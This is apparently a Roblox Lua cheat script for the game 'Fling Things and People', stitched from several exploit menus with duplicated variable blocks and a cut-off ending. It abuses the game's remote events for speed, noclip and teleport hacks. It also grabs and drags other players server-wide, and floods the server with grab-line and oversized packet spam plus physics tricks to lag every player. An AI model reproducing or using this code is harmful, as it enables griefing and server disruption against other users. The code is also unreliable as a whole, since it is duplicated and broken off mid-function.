    local char = plr.Character
    local hrp = char:WaitForChild("HumanoidRootPart")
    local hum = char:WaitForChild("Humanoid")
    while antiGrab1T and task.wait() do
        if plr.IsHeld.Value == true and antiGrab1T == true then
            if hrp ~= nil then
                if antiGrab1AnchorT then
                    hrp.Anchored = true
                    while plr.IsHeld.Value == true do rs.CharacterEvents.Struggle:FireServer(plr);wait(0.001) end
                    hrp.Anchored = false
                elseif not antiGrab1AnchorT then
                    while plr.IsHeld.Value == true do rs.CharacterEvents.Struggle:FireServer(plr);wait(0.001) end
                end
            end
        end
    end
end

function antiBlob1F()
    workspace.DescendantAdded:Connect(function(toy)
        if toy.Name == "CreatureBlobman" and toy.Parent ~= inv and antiBlob1T then
            wait()
            toy.LeftDetector:Destroy()
            toy.RightDetector:Destroy()
        end
    end)
end

function antiExplodeF()
    local char = plr.Character
    local hrp = char:WaitForChild("HumanoidRootPart")
    local hum = char:WaitForChild("Humanoid")
    workspace.ChildAdded:Connect(function(model)
        if model.Name == "Part" and char ~= nil and antiExplodeT then
            local mag = (model.Position - hrp.Position).Magnitude
            if mag <= 20 then
                hrp.Anchored = true
				wait(0.01)
                while char["Right Arm"].RagdollLimbPart.CanCollide == true do wait(0.001) end
                hrp.Anchored = false
            end
        end
    end)
end

function antiLagF()
    local char = plr.Character
    local hrp = char:WaitForChild("HumanoidRootPart")
    local hum = char:WaitForChild("Humanoid")
    if antiLagT == true then
        plr.PlayerScripts.CharacterAndBeamMove.Disabled = true
    elseif antiLagT == false then
        plr.PlayerScripts.CharacterAndBeamMove.Enabled = true
    end
end

function antiStickyF()
    local char = plr.Character
    local hrp = char:WaitForChild("HumanoidRootPart")
    local hum = char:WaitForChild("Humanoid")
    if antiStickyT == true then
        plr.PlayerScripts.StickyPartsTouchDetection.Disabled = true
    elseif antiStickyT == false then
        plr.PlayerScripts.StickyPartsTouchDetection.Enabled = true
    end
end

--LOOPFUNCS--
function getPlayerList()
    local playerList = {}
    for _, p in pairs(game.Players:GetPlayers()) do
        if p ~= plr then
            table.insert(playerList, p.Name .. " (" .. p.DisplayName .. ")")
        end
    end
    return playerList
end

function loopPlayerBlobF()
    updateCurrentBlobmanF()
    for i, e in ipairs(playersInLoop2V) do
        local player
        if game.Players:FindFirstChild(e) then
            player = game.Players:FindFirstChild(e)
        else
            continue
        end
        if blobLoopT then
            blobGrabF(currentBlobS, player.Character:WaitForChild("HumanoidRootPart"), "Left")
            wait(0.05)
            blobDropF(currentBlobS, player.Character:WaitForChild("HumanoidRootPart"), "Left")
            wait(0.05)
            silentBlobGrabF(currentBlobS, player.Character:WaitForChild("HumanoidRootPart"), "Left")
        end
    end
    while task.wait(6.25) and blobLoopT do
        for i, e in ipairs(playersInLoop2V) do
            local player
            if game.Players:FindFirstChild(e) then
                player = game.Players:FindFirstChild(e)
            else
                continue
            end
            blobGrabF(currentBlobS, player.Character:WaitForChild("HumanoidRootPart"), "Left")
            wait(0.05)
            blobDropF(currentBlobS, player.Character:WaitForChild("HumanoidRootPart"), "Left")
            wait(0.05)
            silentBlobGrabF(currentBlobS, player.Character:WaitForChild("HumanoidRootPart"), "Left")
        end
    end
end

--PLAYERFUNCS--
function updateWalkSpeedF()
    local char = plr.Character
    local hrp = char:WaitForChild("HumanoidRootPart")
    local hum = char:WaitForChild("Humanoid")
    if walkSpeedT then
        hum.WalkSpeed = walkSpeedV
    elseif not walkSpeedT then
        hum.WalkSpeed = 16
    end
    hum:GetPropertyChangedSignal("WalkSpeed"):Connect(function()
        if walkSpeedT then
            hum.WalkSpeed = walkSpeedV
        elseif not walkSpeedT then
            hum.WalkSpeed = 16
        end
    end)
end

function updateJumpPowerF()
    local char = plr.Character
    local hrp = char:WaitForChild("HumanoidRootPart")
    local hum = char:WaitForChild("Humanoid")
    if jumpPowerT then
        hum.JumpPower = jumpPowerV
    elseif not jumpPowerT then
        hum.JumpPower = 24
    end
end

function updateNoClipF()
    local char = plr.Character
    local hrp = char:WaitForChild("HumanoidRootPart")
    local hum = char:WaitForChild("Humanoid")
    while noClipT and task.wait(0.1) do
        char.Head.CanCollide = false
        char.Torso.CanCollide = false
    end
    if not noClipT then
        char.Head.CanCollide = true
        char.Torso.CanCollide = true
    end
end

function updateInfJumpF()
    local char = plr.Character
    local hrp = char:WaitForChild("HumanoidRootPart")
    local hum = char:WaitForChild("Humanoid")
    uis.JumpRequest:Connect(function()
        if infJumpT and not infJumpD then
            infJumpD = true
            hum:ChangeState(Enum.HumanoidStateType.Jumping)
            wait()
            infJumpD = false
        end
    end)
end

function updateFloatF()
    local char = plr.Character
    local hrp = char:WaitForChild("HumanoidRootPart")
    local hum = char:WaitForChild("Humanoid")
    if floatT then
    local float = Instance.new('Part')
    float.Name = "floatPart"
    float.Parent = char
    float.Transparency = 1
    float.Size = Vector3.new(2,0.2,1.5)
    float.Anchored = true
    float.CFrame = hrp.CFrame * CFrame.new(0, floatY, 0)
    local function floatLoop()
        if char:FindFirstChild("floatPart") and hrp then
            float.CFrame = hrp.CFrame * CFrame.new(0, floatY, 0)
        end
    end			
    floatFunc = rs2.Heartbeat:Connect(floatLoop)
    elseif not floatT then
        if char:FindFirstChild("floatPart") then
            char:FindFirstChild("floatPart"):Destroy()
        end
    end
end

function masslessF()
    local char = plr.Character
    local hrp = char:WaitForChild("HumanoidRootPart")
    local hum = char:WaitForChild("Humanoid")
    for i, e in char:GetChildren() do
        if e:IsA("BasePart") and masslessT then
            e.Massless = true
        elseif e:IsA("BasePart") and not masslessT then
            e.Massless = false
        end
    end
end

--SERVERFUNCS--
function updateBlobLoopServerF()
    local char = plr.Character
    local hrp = char:WaitForChild("HumanoidRootPart")
    local hum = char:WaitForChild("Humanoid")
    updateCurrentBlobmanF()
    for i, e in game.Players:GetPlayers() do
        if e.Character:FindFirstChild("HumanoidRootPart") == nil then continue end
        if e.Character:FindFirstChild("HumanoidRootPart") and hum then
            if currentBlobS ~= nil and blobLoopServerT then
                blobGrabF(currentBlobS, e.Character:WaitForChild("HumanoidRootPart"), "Left")
                wait(0.05)
                blobDropF(currentBlobS, e.Character:WaitForChild("HumanoidRootPart"), "Left")
                wait(0.05)
                silentBlobGrabF(currentBlobS, e.Character:WaitForChild("HumanoidRootPart"), "Left")
            end
        end
    end
    while blobLoopServerT and task.wait(6.25) do
        for i, e in game.Players:GetPlayers() do
            if e.Character:FindFirstChild("HumanoidRootPart") == nil then continue end
            if e.Character:FindFirstChild("HumanoidRootPart") and hum then
                if currentBlobS ~= nil and blobLoopServerT then
                    blobGrabF(currentBlobS, e.Character:WaitForChild("HumanoidRootPart"), "Left")
                    wait(0.05)
                    blobDropF(currentBlobS, e.Character:WaitForChild("HumanoidRootPart"), "Left")
                    wait(0.05)
                    silentBlobGrabF(currentBlobS, e.Character:WaitForChild("HumanoidRootPart"), "Left")
                end
            end
        end
    end
end

function lagF()
    local char = plr.Character
    local hrp = char:WaitForChild("HumanoidRootPart")
    local hum = char:WaitForChild("Humanoid")
    while wait(1) and lagT do
        for a = 0, linesV do
            for _, player in ipairs(game:GetService("Players"):GetPlayers()) do
                if player.Character.Torso ~= nil then
                    rs.GrabEvents.CreateGrabLine:FireServer(player.Character.Torso, player.Character.Torso.CFrame)
                end
            end
        end
    end
end

function pingF()
    local char = plr.Character
    local hrp = char:WaitForChild("HumanoidRootPart")
    local hum = char:WaitForChild("Humanoid")
    while task.wait() and pingT do
        rs.GrabEvents.ExtendGrabLine:FireServer(string.rep("Balls Balls Balls Balls", packetsV))
    end
end

function shurikenLagServerF()
    local char = plr.Character
    local hrp = char:WaitForChild("HumanoidRootPart")
    local hum = char:WaitForChild("Humanoid")
    if shurikenLagServerT then
        local ToyFolder
        for _, v in pairs(workspace.Plots:GetChildren()) do
            for _, b in pairs(v.PlotSign.ThisPlotsOwners:GetChildren()) do
                if b.Value == plr.Name then
                    ToyFolder = workspace.PlotItems[v.Name]
                end
            end
        end
        local decoys = {}
        local shurikens = {}

        for _, obj in pairs(ToyFolder:GetChildren()) do
            if obj:IsA("Model") then
                if obj.Name == "NpcRobloxianMascot" then
                    table.insert(decoys, obj)
                elseif obj.Name == "NinjaShuriken" then
                    table.insert(shurikens, obj)
                end
            end
        end

        local maxshurikensperdecoy = 8

        for decoyindex, decoy in ipairs(decoys) do
            local decoyHRP = decoy:FindFirstChild("HumanoidRootPart")
            if decoyHRP and shurikenLagServerT then
                local startindex = (decoyindex - 1) * maxshurikensperdecoy + 1
                local endindex = startindex + maxshurikensperdecoy - 1
                for shurikenindex = startindex, endindex do
                    local shuriken = shurikens[shurikenindex]
                    if not shuriken then
                        break
                    end
                    local StickyPart = shuriken:FindFirstChild("StickyPart")
                    if StickyPart then
                        StickyPart.CanTouch = true
                        for _, part in pairs(decoy:GetDescendants()) do
                            if part:IsA("BasePart") then
                                part.CanCollide = false
                            end
                        end
                        local BodyPosition = Instance.new("BodyPosition")
                        BodyPosition.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                        BodyPosition.P = 10000
                        BodyPosition.D = 500
                        BodyPosition.Parent = StickyPart
                        for _, part in pairs(shuriken:GetDescendants()) do
                            if part:IsA("BasePart") then
                                part.CanCollide = false
                            end
                        end
                        for _, child in pairs(StickyPart:GetChildren()) do
                            if child.Name == "TouchInterest" then
                                child:Destroy()
                            end
                        end
                        task.defer(function()
                            repeat
                                StickyPart.AssemblyAngularVelocity = Vector3.new(
                                    math.random(-100, 100) * 50,
                                    math.random(-100, 100) * 50,
                                    math.random(-100, 100) * 50
                                )
                                BodyPosition.Position = Vector3.new(
                                    decoyHRP.Position.X,
                                    decoyHRP.Position.Y - 4,
                                    decoyHRP.Position.Z
                                )
                                wait(0.0001)
                                BodyPosition.Position = Vector3.new(
                                    decoyHRP.Position.X,
                                    decoyHRP.Position.Y + 3,
                                    decoyHRP.Position.Z
                                )
                                wait(0.0001)
                            until not shurikenLagServerT or not shuriken.Parent or not decoy.Parent
                        end)
                    end
                    wait()
                end
            end
            wait()
        end
    end
end

--KEYBINDFUNCS--
function tpF()
    local char = plr.Character
    local hrp = char:WaitForChild("HumanoidRootPart")
    local hum = char:WaitForChild("Humanoid")
    if not slideTPT then
        if char and hrp and mouse.Target and not slideTPT then hrp.CFrame = CFrame.new(mouse.Hit.x, mouse.Hit.y + 5, mouse.Hit.z) end
    elseif slideTPT then
        if not slideTPD and slideTPT and mouse.Target then
            slideTPD = true
            local info = TweenInfo.new(
                0.5, 
                Enum.EasingStyle.Sine, 
                Enum.EasingDirection.In,
                0,
                false,
                0
            )
            local info2 = TweenInfo.new(
                0.5, 
                Enum.EasingStyle.Sine, 
                Enum.EasingDirection.In,
                0,
                true,
                0
            )
            local e = {["CFrame"] = CFrame.new(mouse.Hit.x, mouse.Hit.y + 3, mouse.Hit.z)}
            local e2 = {FieldOfView = 100}
            char.Head.CanCollide = false
            char.Torso.CanCollide = false
            game:GetService("TweenService"):Create(hrp, info, e):Play()
            game:GetService("TweenService"):Create(cam, info2, e2):Play()
            wait(0.55)
            char.Head.CanCollide = true
            char.Torso.CanCollide = true
            cam.FieldOfView = 70
            slideTPD = false
        end
    end
end

function floatUpF()
    local char = plr.Character
    local hrp = char:WaitForChild("HumanoidRootPart")
    local hum = char:WaitForChild("Humanoid")
    if floatUpT and not floatDownT then
        floatY = -1.6
    elseif not floatUpT then
        floatY = -3.1
    end
end

function floatDownF()
    local char = plr.Character
    local hrp = char:WaitForChild("HumanoidRootPart")
    local hum = char:WaitForChild("Humanoid")
    if floatDownT and not floatUpT then
        floatY = -3.6
    elseif not floatDownT then
        floatY = -3.1
    end
end

function inspectF()
    local char = plr.Character
    local hrp = char:WaitForChild("HumanoidRootPart")
    local hum = char:WaitForChild("Humanoid")
    mouseTargetInspectF()
    inspectInfoF()
    if not inspectD then
        inspectD = true
        if inspectT then
            if currentInspectS == 1 then
                currentInspectedAdorneeS = mouse.Target.Parent
                currentInspectedPartS = mouse.Target
                highlightC = highlight:Clone()
                highlightC.Adornee = mouse.Target.Parent
                highlightC.Parent = mouse.Target
                highlightC.FillColor = Color3.fromRGB(255, 255, 255)
                highlightC.OutlineColor = Color3.fromRGB(160, 11, 11)
            elseif currentInspectS == 2 then
                currentInspectedAdorneeS = workspace.Plots:FindFirstChild("Plot"..currentHouseInspectS)
                currentInspectedPartS = mouse.Target
                highlightC = highlight:Clone()
                highlightC.Adornee = workspace.Plots:FindFirstChild("Plot"..currentHouseInspectS)
                highlightC.Parent = mouse.Target
                highlightC.FillColor = Color3.fromRGB(255, 255, 255)
                highlightC.OutlineColor = Color3.fromRGB(0, 60, 180)
            elseif currentInspectS == 3 then
                currentInspectedAdorneeS = mouse.Target.Parent
                currentInspectedPartS = mouse.Target
                highlightC = highlight:Clone()
                highlightC.Adornee = mouse.Target.Parent
                highlightC.Parent = mouse.Target
                highlightC.FillColor = Color3.fromRGB(255, 255, 255)
                highlightC.OutlineColor = Color3.fromRGB(20, 170, 20)
            elseif currentInspectS == 4 then
                currentInspectedAdorneeS = mouse.Target.Parent
                currentInspectedPartS = mouse.Target
                highlightC = highlight:Clone()
                highlightC.Adornee = mouse.Target.Parent
                highlightC.Parent = mouse.Target
                highlightC.FillColor = Color3.fromRGB(255, 255, 255)
                highlightC.OutlineColor = Color3.fromRGB(180, 20, 180)
            end
        elseif not inspectT then
            currentInspectS = 0
            currentHouseInspectS = 0
            currentInspectedPartS = nil
            currentInspectedAdorneeS = nil
            highlightC:Destroy()
        end
        wait(0.1)
        inspectD = false
    end
end

function inspectInfoF()
    local char = plr.Character
    local hrp = char:WaitForChild("HumanoidRootPart")
    local hum = char:WaitForChild("Humanoid")
    if not inspectInfoOnT and inspectInfoT and inspectT and currentInspectS ~= 0 and currentInspectedPartS ~= nil and currentInspectedAdorneeS ~= nil then
        inspectInfoOnT = true
        billboardC = billboard:Clone()
        billboardC.Adornee = currentInspectedAdorneeS
        billboardC.Parent = currentInspectedPartS

        scrollframeC = scrollframe:Clone()
        scrollframeC.Parent = billboardC
        scrollframeC.Size = UDim2.new(0, 160, 0, 40)
        scrollframeC.ScrollBarImageTransparency = 1 

        textlabelC1 = textlabel:Clone()
        textlabelC1.Parent = scrollframeC
        textlabelC1.Size = UDim2.new(0, 140, 0, 40)
        if currentInspectS == 1 then
            textlabelC1.Text = currentInspectedAdorneeS.Name.." ("..game.Players:FindFirstChild(currentInspectedAdorneeS.Name).DisplayName..")"
        else
            textlabelC1.Text = currentInspectedAdorneeS.Name
        end
    elseif not inspectInfoT and inspectInfoOnT or not inspectT and inspectInfoOnT then
        inspectInfoOnT = false
        inspectInfoT = false
        billboardC:Destroy()
    end
end

function inspectBringF()
    local char = plr.Character
    local hrp = char:WaitForChild("HumanoidRootPart")
    local hum = char:WaitForChild("Humanoid")
    if inspectT and currentInspectS ~= 2 and currentInspectS ~= 4 then
        returnPosS = hrp.CFrame
        hrp.CFrame = currentInspectedAdorneeS.PrimaryPart.CFrame + Vector3.new(7, 3, 0)
        wait(0.15)
        if currentInspectS == 1 then
            rs.GrabEvents.SetNetworkOwner:FireServer(currentInspectedAdorneeS:WaitForChild("HumanoidRootPart"), currentInspectedAdorneeS:WaitForChild("HumanoidRootPart").CFrame)
            wait(0.1)
            currentInspectedAdorneeS:WaitForChild("HumanoidRootPart").CFrame = returnPosS
        else
            rs.GrabEvents.SetNetworkOwner:FireServer(currentInspectedAdorneeS.PrimaryPart, currentInspectedAdorneeS.PrimaryPart.CFrame)
            wait(0.1)
            currentInspectedAdorneeS.PrimaryPart.CFrame = returnPosS
        end
        hrp.CFrame = returnPosS
    elseif not inspectT then
        if mouse.Target.Parent:IsDescendantOf(workspace.PlotItems) or string.match(mouse.Target.Parent.Parent.Name, "SpawnedInToys") or mouse.Target.Parent.Parent:FindFirstChild("SpawningPlatform") or mouse.Target.Parent:FindFirstChildOfClass("Humanoid") then
            returnPosS = hrp.CFrame
            mouseTargetS = mouse.Target
            hrp.CFrame = mouseTargetS.Parent.PrimaryPart.CFrame + Vector3.new(10, 3, 0)
            wait(0.15)
            if mouseTargetS.Parent:FindFirstChildOfClass("Humanoid") then
                rs.GrabEvents.SetNetworkOwner:FireServer(mouseTargetS.Parent:WaitForChild("HumanoidRootPart"), mouseTargetS.Parent:WaitForChild("HumanoidRootPart").CFrame)
                wait(0.1)
                mouseTargetS.Parent:WaitForChild("HumanoidRootPart").CFrame = returnPosS
            else
                rs.GrabEvents.SetNetworkOwner:FireServer(mouseTargetS.Parent.PrimaryPart, mouseTargetS.Parent.PrimaryPart.CFrame)
                wait(0.1)
                mouseTargetS.Parent.PrimaryPart.CFrame = returnPosS
            end
            hrp.CFrame = returnPosS
            mouseTargetS = nil
        end
    end
end

function ragdollSpamF()
    local char = plr.Character
    local hrp = char:WaitForChild("HumanoidRootPart")
    local hum = char:WaitForChild("Humanoid")
    while ragdollSpamT and not ragdollSpamD and not permRagdollT do
        ragdollSpamD = true
            local args = {
                [1] = hrp,
                [2] = 0
            }
            rs:WaitForChild("CharacterEvents"):WaitForChild("RagdollRemote"):FireServer(unpack(args))
        task.wait(0.02)
        ragdollSpamD = false
    end
end

function setRagdollF(state)
    local char = plr.Character
    local hrp = char:WaitForChild("HumanoidRootPart")
    local hum = char:WaitForChild("Humanoid")
    if char and char:FindFirstChild("HumanoidRootPart") then
        rs:WaitForChild("CharacterEvents"):WaitForChild("RagdollRemote"):FireServer(hrp, state and 1 or 0)
        if hum then hum.PlatformStand = state end
    end
end

function permRagdollLoopF()
    local char = plr.Character
    local hrp = char:WaitForChild("HumanoidRootPart")
    local hum = char:WaitForChild("Humanoid")
    if permRagdollRunningS then return end
    permRagdollRunningS = true
    while permRagdollT do
        setRagdollF(true)
        task.wait(0.5)
    end
    permRagdollRunningS = false
    setRagdollF(false)
end

function getBlobmanF()
    local char = plr.Character
    local hrp = char:WaitForChild("HumanoidRootPart")
    local hum = char:WaitForChild("Humanoid")
    updateCurrentHouseF()
    if currentHouseS == 0 then
        if inv then return inv:FindFirstChild("CreatureBlobman") end
        return nil
    else
        return workspace.PlotItems:FindFirstChild("Plot"..currentHouseS):FindFirstChild("CreatureBlobman")
    end
end

function spawnBlobmanF()
    local char = plr.Character
    local hrp = char:WaitForChild("HumanoidRootPart")
    local hum = char:WaitForChild("Humanoid")
    local spawnRemote = rs:WaitForChild("MenuToys"):WaitForChild("SpawnToyRemoteFunction")
    if spawnRemote then
        pcall(function()spawnRemote:InvokeServer("CreatureBlobman", hrp.CFrame*CFrame.new(0,0,-5),Vector3.new(0, -15.716, 0))end)
        task.wait(1)
        blobmanInstanceS = getBlobmanF()
    end
end

function destroyBlobmanF()
    local char = plr.Character
    local hrp = char:WaitForChild("HumanoidRootPart")
    local hum = char:WaitForChild("Humanoid")
    if blobmanInstanceS and destroyAutoGucciT then
        if currentHouseS == 0 then
            local args = {[1] = blobmanInstanceS}
            local destroyRemote = rs:FindFirstChild("MenuToys") and rs.MenuToys:FindFirstChild("DestroyToy")
            if destroyRemote then pcall(function()destroyRemote:FireServer(unpack(args))end)end
            blobmanInstanceS = nil
        else
            blobmanInstanceS.HumanoidRootPart.CFrame = workspace.Plots:FindFirstChild("Plot"..currentHouseS).TeslaCoil.ZapPart.CFrame
            blobmanInstanceS = nil
        end
    end
end

function ragdollLoopF()
    local char = plr.Character
    local hrp = char:WaitForChild("HumanoidRootPart")
    local hum = char:WaitForChild("Humanoid")
    if ragdollLoopD then return end
    ragdollLoopD = true
    while sitJumpT do
        if char and hrp then
            local args={[1] = hrp, [2] = 0}
            rs:WaitForChild("CharacterEvents"):WaitForChild("RagdollRemote"):FireServer(unpack(args))
        end
        task.wait()
    end
    ragdollLoopD = false
end

function sitJumpF()
    local char = plr.Character
    local hrp = char:WaitForChild("HumanoidRootPart")
    local hum = char:WaitForChild("Humanoid")
    if not char or not hum then return end
    local startTime = tick()
    while autoGucciT and tick()-startTime<6 do
        if blobmanInstanceS then
            local seat = blobmanInstanceS:FindFirstChildWhichIsA("VehicleSeat")
            if seat and seat.Occupant ~= hum then seat:Sit(hum) end
        end
        task.wait(0.1)
        if char and hum then hum:ChangeState(Enum.HumanoidStateType.Jumping)end
        task.wait(0.1)
    end
    if blobmanInstanceS then destroyBlobmanF() end
    autoGucciT = false
    sitJumpT = false
end

function stopVelocityF()
    local char = plr.Character
    local hrp = char:WaitForChild("HumanoidRootPart")
    local hum = char:WaitForChild("Humanoid")
    hrp.AssemblyLinearVelocity = Vector3.zero
end

function zoomF()
    local char = plr.Character
    local hrp = char:WaitForChild("HumanoidRootPart")
    local hum = char:WaitForChild("Humanoid")
    if zoomT then
        cam.FieldOfView = zoomV
    elseif not zoomT then
        cam.FieldOfView = 70
    end
end

--VARIABLES--
plr = game.Players.LocalPlayer
cam = workspace.CurrentCamera
mouse = plr:GetMouse()
uis = game:GetService("UserInputService")
inv = workspace:WaitForChild(plr.Name.."SpawnedInToys")
rs = game:GetService("ReplicatedStorage")
rs2 = game:GetService("RunService")
deb = game:GetService("Debris")


-- Cosmic Hub FTAP
Players = game:GetService("Players")
RunService = game:GetService("RunService")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Debris = game:GetService("Debris")

local GrabEvents = ReplicatedStorage:WaitForChild("GrabEvents")
local MenuToys = ReplicatedStorage:WaitForChild("MenuToys")
local CharacterEvents = ReplicatedStorage:WaitForChild("CharacterEvents")
local SetNetworkOwner = GrabEvents:WaitForChild("SetNetworkOwner")
local Struggle = CharacterEvents:WaitForChild("Struggle")
local CreateLine = GrabEvents:WaitForChild("CreateGrabLine")
local DestroyLine = GrabEvents:WaitForChild("DestroyGrabLine")
local DestroyToy = MenuToys:WaitForChild("DestroyToy")

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local localPlayer = Players.LocalPlayer
local CharacterEvents = ReplicatedStorage:WaitForChild("CharacterEvents")
local StruggleRemote = CharacterEvents:WaitForChild("Struggle")
local RagdollRemote = CharacterEvents:WaitForChild("RagdollRemote")
local BeingHeld = localPlayer:WaitForChild("IsHeld")
_G.antiBlobmanActive = false
_G.toggleActiveAntiKick = false
_G.initialPosition = nil
_G.velocityThreshold = 1000
_G.grabDistanceThreshold = 10

local selectedPlayer

local function getAllPlayers()
    local playerNames = {}
    for _, player in ipairs(Players:GetPlayers()) do
        table.insert(playerNames, player.Name)
    end
    return playerNames
end

local playerDropdown
Players.PlayerAdded:Connect(function()
    if playerDropdown then
        playerDropdown:Refresh(getAllPlayers(), true)
    end
end)
Players.PlayerRemoving:Connect(function()
    if playerDropdown then
        playerDropdown:Refresh(getAllPlayers(), true)
    end
end)


-- // Helper Functions
function runAntiKickLoop()
    while _G.toggleActiveAntiKick do
        local humanoidRootPart = localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart")
        if humanoidRootPart then
            RagdollRemote:FireServer(humanoidRootPart, 0)
        end
        task.wait(1)
    end
end

local antiKickCoroutine
function toggleAntiKick(state)
    _G.toggleActiveAntiKick = state
    if state and not antiKickCoroutine then
        antiKickCoroutine = coroutine.create(runAntiKickLoop)
        coroutine.resume(antiKickCoroutine)
    elseif not state and antiKickCoroutine then
        antiKickCoroutine = nil
    end
end
function resetVelocityAndPosition(humanoidRootPart)
    humanoidRootPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
    humanoidRootPart.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
    humanoidRootPart.CFrame = CFrame.new(_G.initialPosition)
end
function antiBlobmanLoop()
    while _G.antiBlobmanActive do
        local char = localPlayer.Character
        local humanoidRootPart = char and char:FindFirstChild("HumanoidRootPart")
        
        if humanoidRootPart and BeingHeld.Value then
            local velocity = humanoidRootPart.AssemblyLinearVelocity
            local distanceMoved = (humanoidRootPart.Position - _G.initialPosition).Magnitude
            
            -- Check for excessive movement
            if velocity.Magnitude > _G.velocityThreshold or distanceMoved > _G.grabDistanceThreshold then
                resetVelocityAndPosition(humanoidRootPart)
                StruggleRemote:FireServer(localPlayer) 
            end
        end
        task.wait(0.05) 
    end
end

local antiBlobmanCoroutine
function toggleAntiBlobman(state)
    _G.antiBlobmanActive = state
    _G.initialPosition = localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart") and localPlayer.Character.HumanoidRootPart.Position or Vector3.new(0, 0, 0)
    if state and not antiBlobmanCoroutine then
        antiBlobmanCoroutine = coroutine.create(antiBlobmanLoop)
        coroutine.resume(antiBlobmanCoroutine)
    elseif not state and antiBlobmanCoroutine then
        antiBlobmanCoroutine = nil
    end
end

function toggleProtections(state)
    toggleAntiKick(state)
    toggleAntiBlobman(state)
end



local localPlayer = Players.LocalPlayer
local playerCharacter = localPlayer.Character or localPlayer.CharacterAdded:Wait()

localPlayer.CharacterAdded:Connect(function(character)
playerCharacter = character
end)

local ragdollAllCoroutine
local fireAllCoroutine







-- Lag Settings
local lagIntensity = 50
local batchSize = 50
local batchInterval = 0.08
local reExecuteEnabled = false
local reExecuteInterval = 3
local mainEnabled = false
local invisibleLagEnabled = false
local nonLagLagEnabled = false
local range = 100
local targetPart = Workspace:FindFirstChildOfClass("Part")
local randomRange = 100
local loopsPerRequest = 1000
local isLagAllToggled = false
local targetType = "Workspace"
local currentPlayerIndex = 1
local speedMultiplier = 1.1


--VARIABLES--
plr = game.Players.LocalPlayer
cam = workspace.CurrentCamera
mouse = plr:GetMouse()
uis = game:GetService("UserInputService")
inv = workspace:WaitForChild(plr.Name.."SpawnedInToys")
rs = game:GetService("ReplicatedStorage")
rs2 = game:GetService("RunService")
deb = game:GetService("Debris")

--TOGGLES--
flingT = nil
killGrabT = nil
infLineExtendT = nil
antiGrab1T = nil
antiGrab1AnchorT = true
antiBlob1T = nil
antiExplodeT = true
antiLagT = nil
antiStickyT = nil
blobLoopT = nil
walkSpeedT = nil
jumpPowerT = nil
infJumpT = nil
noClipT = nil
floatT = nil
masslessT = nil
blobLoopServerT = nil
blobLoopServerTwoHandT = nil
silentBlobServerT = nil
lagT = nil
pingT = nil
shurikenLagServerT = nil
slideTPT = nil
inspectT = false
inspectInfoT = false
inspectInfoOnT = false
ragdollSpamT = false
permRagdollT = nil
autoGucciT = nil
destroyAutoGucciT = nil
sitJumpT = false
floatUpT = false
floatDownT = false
zoomT = false
spychatT = nil
spySelfT = nil
publicSpyT = nil

--VALUES--
strengthV = 1000
lineDistanceV = 0
increaseLineExtendV = 0
walkSpeedV = 16
jumpPowerV = 24
floatY = -3.1
zoomV = 20
linesV = 400
packetsV = 3000
playersInLoop1V = {}
playersInLoop2V = {}

--STATUSES--
currentHouseS = 0
blobmanInstanceS = nil
currentBlobS = nil
currentInspectS = 0
currentHouseInspectS = 0
currentInspectedAdorneeS = nil
currentInspectedPartS = nil
permRagdollRunningS = false
returnPosS = CFrame.new(0, 0, 0)
mouseTargetS = nil

--DEBS--
infJumpD = false
inspectD = false
slideTPD = false
ragdollSpamD = false
ragdollLoopD = false

--INSTANCES--
highlight = Instance.new("Highlight")
highlight.Name = "highlight"
highlight.Enabled = true
highlight.FillTransparency = 0.9
highlight.OutlineTransparency = 0

billboard = Instance.new("BillboardGui")
billboard.Name = "billboard"
billboard.Size = UDim2.new(0, 100, 0, 150)
billboard.StudsOffset = Vector3.new(0, 1, 0)
billboard.AlwaysOnTop = true

scrollframe = Instance.new("ScrollingFrame")
scrollframe.Name = "scrollframe"
scrollframe.ScrollingEnabled = false
scrollframe.BackgroundTransparency = 0.7

textlabel = Instance.new("TextLabel")
textlabel.Name = "textlabel"
textlabel.TextScaled = true
textlabel.BackgroundTransparency = 1

--GENERALFUNCS--
function updateCurrentBlobmanF()
    local char = plr.Character
    local hrp = char:WaitForChild("HumanoidRootPart")
    local hum = char:WaitForChild("Humanoid")
    for _, blobs in workspace:GetDescendants() do
        if blobs.Name ~= "CreatureBlobman" then continue end
        if not blobs:FindFirstChild("VehicleSeat") then continue end
        if not blobs.VehicleSeat:FindFirstChild("SeatWeld") then continue end
        if blobs.VehicleSeat.SeatWeld.Part1 == hrp then
            currentBlobS = blobs
        end
    end
end

function blobGrabF(blob, target, side)
    local char = plr.Character
    local hrp = char:WaitForChild("HumanoidRootPart")
    local hum = char:WaitForChild("Humanoid")
    local args = {
        [1] = blob:FindFirstChild(side.."Detector"),
        [2] = target,
        [3] = blob:FindFirstChild(side.."Detector"):FindFirstChild(side.."Weld"),
        }
        blob.BlobmanSeatAndOwnerScript.CreatureGrab:FireServer(unpack(args))
end

function blobDropF(blob, target, side)
    local char = plr.Character
    local hrp = char:WaitForChild("HumanoidRootPart")
    local hum = char:WaitForChild("Humanoid")
    local args = {
        [1] = blob:FindFirstChild(side.."Detector"):FindFirstChild(side.."Weld"),
        [2] = target,
        }
        blob.BlobmanSeatAndOwnerScript.CreatureDrop:FireServer(unpack(args))
end

function silentBlobGrabF(blob, target, side)
    local char = plr.Character
    local hrp = char:WaitForChild("HumanoidRootPart")
    local hum = char:WaitForChild("Humanoid")
    local args = {
        [1] = blob:FindFirstChild(side.."Detector"),
        [2] = target,
        [3] = blob:FindFirstChild(side.."Detector").AttachPlayer,
        }
        blob.BlobmanSeatAndOwnerScript.CreatureGrab:FireServer(unpack(args))
end

function updateCurrentHouseF()
    local char = plr.Character
    local hrp = char:WaitForChild("HumanoidRootPart")
    local hum = char:WaitForChild("Humanoid")
    if char.Parent == workspace then
        currentHouseS = 0
    elseif char.Parent.Name == "PlayersInPlots" then
        for i, e in workspace.Plots:GetChildren() do
            for i, e in e.PlotSign.ThisPlotsOwners:GetChildren() do
                if e.Value == plr.Name then
                    if e.Parent.Parent.Parent.Name == "Plot1" then
						currentHouseS = 1
					elseif e.Parent.Parent.Parent.Name == "Plot2" then
						currentHouseS = 2
